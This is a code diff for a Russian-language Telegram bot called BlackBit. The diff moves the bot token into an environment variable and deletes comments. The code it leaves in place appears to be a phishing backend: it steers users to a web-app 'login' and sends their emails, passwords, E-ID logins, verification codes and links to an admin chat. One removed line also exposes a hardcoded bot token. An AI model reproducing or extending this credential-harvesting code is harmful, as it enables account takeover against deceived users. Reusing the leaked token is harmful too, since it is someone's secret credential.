@@ -8,7 +8,7 @@ from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = "8513048605:AAFci_ffK2rywhBmIPSGkGMM7umZnjQbtdU"
+BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
 ADMIN_ID = 8893485920
 WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
 # ===============================================
@@ -29,7 +29,6 @@ class BlackBitBot:
         user = update.effective_user
         current_time = datetime.now().strftime("%d.%m.%Y %H:%M")
 
-        # Уведомление в группу
         await self.app.bot.send_message(
             chat_id=ADMIN_ID,
             text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
@@ -40,7 +39,6 @@ class BlackBitBot:
             parse_mode="Markdown"
         )
 
-        # Приветствие пользователю
         await update.message.reply_text(
             f"👋 Привет, {user.first_name}!\n\n"
             f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение BlackBit.\n\n"
@@ -61,11 +59,9 @@ class BlackBitBot:
         user_id = msg.from_user.id
         text = msg.text
 
-        # Если сообщение из группы — игнорируем
         if chat_id == ADMIN_ID:
             return
 
-        # ---- Если пользователь вводит код ----
         if user_sessions.get(user_id, {}).get('awaiting_code'):
             await self.app.bot.send_message(
                 ADMIN_ID,
@@ -76,7 +72,6 @@ class BlackBitBot:
             await msg.reply_text("✅ Код отправлен администратору!")
             return
 
-        # ---- Если пользователь вводит ссылку ----
         if user_sessions.get(user_id, {}).get('awaiting_link'):
             await self.app.bot.send_message(
                 ADMIN_ID,
@@ -87,7 +82,6 @@ class BlackBitBot:
             await msg.reply_text("✅ Ссылка отправлена администратору!")
             return
 
-        # ---- Если это JSON от Mini App ----
         if text and text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
@@ -97,7 +91,6 @@ class BlackBitBot:
                 link = data.get('link')
                 eid_type = data.get('type')
 
-                # ---- Обычный вход ----
                 if email and password and not code and not link and not eid_type:
                     await self.app.bot.send_message(
                         ADMIN_ID,
@@ -110,7 +103,6 @@ class BlackBitBot:
                     await msg.reply_text("✅ Заявка отправлена администратору!")
                     return
 
-                # ---- E-ID вход ----
                 if eid_type == 'eid_login' and email and password:
                     await self.app.bot.send_message(
                         ADMIN_ID,
@@ -123,7 +115,6 @@ class BlackBitBot:
                     await msg.reply_text("✅ Заявка E-ID отправлена администратору!")
                     return
 
-                # ---- Код ----
                 if code:
                     await self.app.bot.send_message(
                         ADMIN_ID,
@@ -133,7 +124,6 @@ class BlackBitBot:
                     await msg.reply_text("✅ Код отправлен администратору!")
                     return
 
-                # ---- Ссылка ----
                 if link:
                     await self.app.bot.send_message(
                         ADMIN_ID,
@@ -151,7 +141,6 @@ class BlackBitBot:
             if text:
                 await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
 
-    # ===== 3. Запуск =====
     def run(self):
         try:
             requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
